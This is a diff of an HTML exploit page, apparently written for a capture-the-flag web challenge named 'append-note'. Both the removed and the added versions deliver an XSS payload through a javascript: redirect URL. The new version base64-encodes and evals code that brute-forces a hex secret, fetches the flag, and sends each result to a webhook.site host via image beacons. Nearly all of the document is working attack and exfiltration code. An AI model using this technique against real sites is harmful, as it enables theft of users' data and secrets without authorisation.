@@ -1,22 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS via redirect</title></head>
+<head><title>XSS Exploit</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
-var TARGET = "https://append-note-hfskv.instancer.lac.tf";
-var WEBHOOK = "https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d";
+var TARGET = "https://append-note-r658w.instancer.lac.tf";
+var WEBHOOK = "https://webhook.site/301f33af-6ef2-4b91-b9fe-ce6057c122df";
 
-// Use backticks to avoid quote escaping by Jinja2
-// The XSS payload fetches / which shows notes including SECRET
-var payload = "javascript:fetch(`/`).then(r=>r.text()).then(t=>{new Image().src=`https://webhook.site/70d9bf2c-e5cf-49dc-aeed-4203dbfd538d?d=`+btoa(t)})";
+// Full exploit code - runs in same-origin context after XSS
+var code = `
+(async()=>{
+  const W='https://webhook.site/301f33af-6ef2-4b91-b9fe-ce6057c122df';
+  const C='0123456789abcdef';
+  const log=(m)=>{new Image().src=W+'?m='+encodeURIComponent(m)};
+  log('XSS_EXEC');
+  let s='';
+  for(let p=0;p<8;p++){
+    for(let c of C){
+      try{
+        const r=await fetch('/append?content='+encodeURIComponent(s+c)+'&url=/');
+        if(r.status===200){s+=c;log('P'+p+'='+c);break;}
+      }catch(e){log('E:'+e)}
+    }
+  }
+  log('SECRET='+s);
+  try{
+    const f=await fetch('/flag?secret='+s);
+    const t=await f.text();
+    log('FLAG='+t);
+  }catch(e){log('FE:'+e)}
+})()
+`;
 
-navigator.sendBeacon(WEBHOOK, "XSS_V2");
+// Encode to base64 - use btoa
+var b64 = btoa(code);
 
-document.getElementById('s').textContent = 'Redirecting...';
+// javascript: URL with eval(atob(...)) - no quotes needed inside
+var payload = "javascript:eval(atob(`" + b64 + "`))";
 
-// Navigate to /append with javascript: URL redirect
-window.location = TARGET + "/append?content=x&url=" + encodeURIComponent(payload);
+navigator.sendBeacon(WEBHOOK, "EXPLOIT_START");
+
+document.getElementById('s').textContent = 'Redirecting with XSS...';
+
+// Navigate to trigger the XSS
+window.location = TARGET + "/append?content=init&url=" + encodeURIComponent(payload);
 </script>
 </body>
 </html>
